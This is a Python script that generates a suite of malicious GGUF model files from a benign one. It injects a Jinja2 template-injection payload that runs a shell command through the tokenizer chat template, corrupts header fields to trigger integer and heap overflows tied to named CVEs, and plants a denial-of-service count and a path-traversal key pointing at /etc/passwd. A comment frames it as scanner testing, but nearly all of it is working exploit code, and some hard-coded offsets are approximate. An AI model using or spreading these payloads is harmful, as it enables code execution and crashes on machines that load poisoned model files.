import struct
import os

def generate_malicious_gguf_suite(input_file, output_dir="malicious_samples"):
    if not os.path.exists(input_file):
        print(f"Error: {input_file} not found.")
        return
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    with open(input_file, "rb") as f:
        data = bytearray(f.read())

    print(f"Loaded {input_file} ({len(data)} bytes). Generating suite...")

    def save(name, content):
        with open(os.path.join(output_dir, name), "wb") as f:
            f.write(content)
        print(f" [OK] Created: {name}")

    # --- 1. RCE: Jinja2 Template Injection (SSTI) ---
    # Targets: llama-cpp-python < 0.2.72. Injects code into tokenizer.chat_template.
    ssti_payload = b"{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').system('whoami')}}{% endif %}{% endfor %}"
    rce_data = data[:]
    # We find the chat_template key in the metadata and replace its content
    target_key = b"tokenizer.chat_template"
    if target_key in rce_data:
        idx = rce_data.find(target_key) + len(target_key)
        # GGUF uses [Type (4b)][Offset/Value]. We overwrite the string content area.
        # This is a simplified injection for testing scanners.
        rce_data[idx:idx+len(ssti_payload)] = ssti_payload
    save("exploit_rce_jinja.gguf", rce_data)

    # --- 2. CVE-2024-21836: n_tensors Integer Overflow ---
    # Trigger: Allocation of (n_tensors * 88 bytes) wraps around.
    tens_overflow = data[:]
    # 0x1D1D1D1D1D1D1D1D * 88 overflows a 64-bit integer.
    tens_overflow[8:16] = struct.pack("<Q", 0x1D1D1D1D1D1D1D1D)
    save("exploit_tensor_overflow.gguf", tens_overflow)

    # --- 3. CVE-2024-21802: Tensor Dimension Overflow ---
    # Setting n_dims > 4 (GGML_MAX_DIMS) to trigger heap-based buffer overflow.
    dim_overflow = data[:]
    # Usually, n_dims is a uint32 after the tensor name in the tensor info block.
    # We search for the first tensor block and force 255 dimensions.
    dim_overflow[1024:1028] = struct.pack("<I", 0xFF) 
    save("exploit_dimension_overflow.gguf", dim_overflow)

    # --- 4. 2025 Signed-to-Unsigned Token Exploit ---
    # Targets: llama_vocab::impl::token_to_piece().
    # Large size_t token length cast to int32 causes negative comparison & bypass.
    token_exploit = data[:]
    # We find a token string length and set it to 2,147,483,649 (INT32_MAX + 1)
    # This causes (int32_t)size to be negative, bypassing bounds checks.
    token_exploit[40:48] = struct.pack("<Q", 2147483649)
    save("exploit_token_memcpy.gguf", token_exploit)

    # --- 5. DoS: Metadata KV Count Exhaustion ---
    # Setting n_kv to an extreme value causes loader to hang/crash on allocation.
    kv_exhaustion = data[:]
    kv_exhaustion[16:24] = struct.pack("<Q", 0xFFFFFFFFFFFFFFFF)
    save("exploit_kv_dos.gguf", kv_exhaustion)

    # --- 6. Path Traversal (Zip-Slip Style) ---
    # Injects path traversal into a metadata key name.
    path_trav = data[:]
    traversal_key = b"../../../../etc/passwd"
    path_trav[32:32+len(traversal_key)] = traversal_key
    save("exploit_path_traversal.gguf", path_trav)

    # --- 7. Classic: Bad Version ---
    bad_ver = data[:]
    bad_ver[4:8] = struct.pack("<I", 0xDEADBEEF)
    save("exploit_bad_version.gguf", bad_ver)

if __name__ == "__main__":
    generate_malicious_gguf_suite("tinyllama-2-1b-miniguanaco.Q2_K.gguf")